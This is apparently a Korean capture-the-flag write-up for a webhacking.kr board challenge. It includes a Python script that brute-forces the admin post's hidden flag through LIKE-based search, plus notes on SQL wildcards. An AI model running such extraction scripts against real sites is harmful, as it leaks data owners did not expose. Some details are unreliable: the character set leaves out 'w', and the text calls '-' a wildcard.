# 문제

- 2개의 글이 올려진 게시판이 나옴
- 해당 글을 확인하는 것과 글 내용을 검색하는 기능만 있음
- admin이 쓰여진 글은 확인이 안되고, guest가 쓴 글만 확인 가능
  - 검색은 말그대로 검색임

# 풀이

- 처음으로 쿼터값을 넣어서 sql인젝션을 시도해봄

  - search와 글 확인 링크의 get파라미터 모두 시도해봤으나 안됨
  - 이것저것 막 입력해봤는데 admin 글이 검색됨
  - 이거다

- 코딩을 해보자

  - 브루트포스로 한 글자씩 알아내기

    ```python
    flags = ''
    keys = 'abcdefghijklnmopqrstuvxyzABCDEFGHIJKLNMOPQRSTUVXYZ1234567890!@#*$^&()-[]{}=+_?'
    
    while True:
        flag_find = 0
        for ch in keys:
            print 'trying bruteforce attack using {' + ch + '}'
            data = {'search': flags + ch}
            url = 'https://www.webhacking.kr/'
            res = requests.post(url+page, data=data, cookies=cookies, verify=False)
            if res.text.find('admin') != -1:
                print 'founded!!'
                print 'chr: ' + ch
                print 'current: ' + flags
                flags += ch
                flag_find = 1
                break
    
        if flag_find == 0:
            break
    
    print 'founded flags successfully...'
    print 'flags: ' + flags
    ```

  - 주의할 점

    - `-`를 마지막에 검사해야 한다.
    - 모든 문자를 나타내는 특수문자이기 때문에 미리 검사를 하게되면 대상 문자열이 존재하는한 검사루틴에서 항상 True가 나온다.

- 어쨌든 끝

# 알게된 것

### LIKE 연산자 in sql

- 속성에서 패턴을 검색(=`grep in linux`)

- 표현

  -  `%`

    - 와일드카드(=`* in linux`)

  - `_`

    - 자릿수

  - 예시

    `__ABC%`

    - 3번째부터 5번째까지 ABC를 갖고있는 모든 값

    `__ABC`

    - 3번째부터 5번째까지 ABC를 갖는것으로 끝나는 모든 값